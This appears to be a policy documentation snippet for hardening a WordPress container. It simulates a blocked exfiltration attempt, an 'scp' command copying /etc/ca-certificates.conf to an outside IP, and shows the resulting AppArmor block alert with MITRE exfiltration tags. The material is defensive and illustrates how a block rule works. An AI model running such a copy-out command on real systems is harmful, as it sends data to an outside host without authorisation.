#### Simulation
```sh
root@wordpress-fb448db97-wj7n7:/usr/bin# scp /etc/ca-certificates.conf 104.192.3.74:/mine/                              
bash: /usr/bin/scp: Permission denied                                                                                   
root@wordpress-fb448db97-wj7n7:/usr/bin#     
```

#### Expected Alert
```
ClusterName: default                                                                                                    
HostName: master-node                                                                                                   
NamespaceName: wordpress-mysql                                                                                          
PodName: wordpress-fb448db97-wj7n7                                                                                      
Labels: app=wordpress                                                                                                   
ContainerName: wordpress                                                                                                
ContainerID: 548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f                                           
ContainerImage: docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845                                                                                                                  
Type: MatchedPolicy                                                                                                     
PolicyName: harden-wordpress-remote-file-copy                                                                           
Severity: 5                                                                                                             
Message: Alert! remote file copy tools execution prevented.                                                             
Source: /bin/bash                                                                                                       
Resource: /usr/bin/scp /etc/ca-certificates.conf 104.192.3.74:/mine/                                                    
Operation: Process                                                                                                      
Action: Block                                                                                                           
Data: syscall=SYS_EXECVE                                                                                                
Enforcer: AppArmor                                                                                                      
Result: Permission denied                                                                                               
ATags: [MITRE MITRE_TA0008_lateral_movement MITRE_TA0010_exfiltration MITRE_TA0006_credential_access MITRE_T1552_unsecured_credentials NIST_800-53_SI-4(18) NIST NIST_800-53 NIST_800-53_SC-4]                                                  
HostPID: 72178                                                                                                          
HostPPID: 30490                                                                                                         
Owner: map[Name:wordpress Namespace:wordpress-mysql Ref:Deployment]                                                     
PID: 259                                                                                                                
PPID: 193                                                                                                               
ParentProcessName: /bin/bash                                                                                            
ProcessName: /usr/bin/scp                                                                                               
Tags: MITRE,MITRE_TA0008_lateral_movement,MITRE_TA0010_exfiltration,MITRE_TA0006_credential_access,MITRE_T1552_unsecured_credentials,NIST_800-53_SI-4(18),NIST,NIST_800-53,NIST_800-53_SC-4  
```